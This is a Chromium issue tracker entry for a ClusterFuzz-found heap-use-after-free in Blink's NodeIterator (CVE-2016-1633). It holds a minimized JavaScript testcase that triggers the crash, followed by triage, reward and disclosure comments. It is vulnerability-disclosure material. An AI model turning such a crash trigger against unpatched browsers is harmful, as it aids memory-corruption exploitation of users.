Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5654703125299200

Uploader: inferno@chromium.org
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x60e00003f7a0
Crash State:
  blink::NodeIterator::updateForNodeRemoval
  blink::NodeIterator::nodeWillBeRemoved
  blink::Document::nodeChildrenWillBeRemoved
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=307479:307632
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=369666:369695

Minimized Testcase (1.04 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94xUx77xC_xTlcKlbQXnsvrjkmJtk8tjHUgl5eSjMPwxBNHOlRy7Z7BTtRdnzqhBIGbbasWebIji9q6djUFwDP7jE3uLQjwWWYlAN1EzENyEJM8jEdloYg664TBoVpTnIw407ihb0gXuAWsjCvJv8Arr1DNTA
<script>
	o172=document.createElement('a');
	o390=document.createElement('u');
	o461=document.importNode(o172);
	o390.appendChild(o461);
	o893=o461.parentElement;
	document.documentElement.appendChild(o893);
	o910=document.createElement('input');
	o461.appendChild(o910);
	o910.type='image';
	document.execCommand('');
	o1050=document.createElement('meta');
	document.documentElement.innerHTML='';
	o1104=document.createElement('table');
	document.body.appendChild(o1104);
	o1050.contentEditable=false;
	o1189=document.createElement('input');
	o1104.appendChild(o1189);
	o1050.setAttribute('dir','rtl');
	o1291=o1189.createShadowRoot();
	o1291.appendChild(o1050);
	o1416=o1050.attributes[1];
	o1050.removeAttribute(o1416.name);
	document.createNodeIterator(o1416);
	o1716=document.implementation.createDocument( '', null).implementation.createDocument( '', null);
	o1724=document.createElement('t');
	o1716.appendChild(o1724);
	o1716.appendChild(document.replaceChild(o1716.documentElement,document.documentElement));
	gc();
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### ti...@google.com (2016-01-19)

[Empty comment from Monorail migration]

### ti...@google.com (2016-01-19)

[Automated comment] Commit may have occurred before M49 branch point (1/15/2016), needs manual review.

### ss...@google.com (2016-01-21)

Looks like this change is already in M49. Please confirm and remove merge request if that is the case.

### ti...@google.com (2016-01-23)

Yes, branched at 369907 so this change is in.

### ti...@google.com (2016-02-24)

[Empty comment from Monorail migration]

### ti...@google.com (2016-03-02)

Congrats - $3000 for this report! CVE-ID to follow.

### ti...@google.com (2016-03-02)

CVE-2016-1633

### ti...@google.com (2016-03-12)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-04-22)

This security bug has been closed for more than 14 weeks. Removing view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/572537?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083467)*
